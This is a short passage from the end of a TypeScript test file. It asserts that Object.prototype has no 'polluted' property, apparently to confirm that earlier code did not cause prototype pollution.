
        // Ensure no pollution
        expect((Object.prototype as any).polluted).toBeUndefined()
      })
    })
  })
})
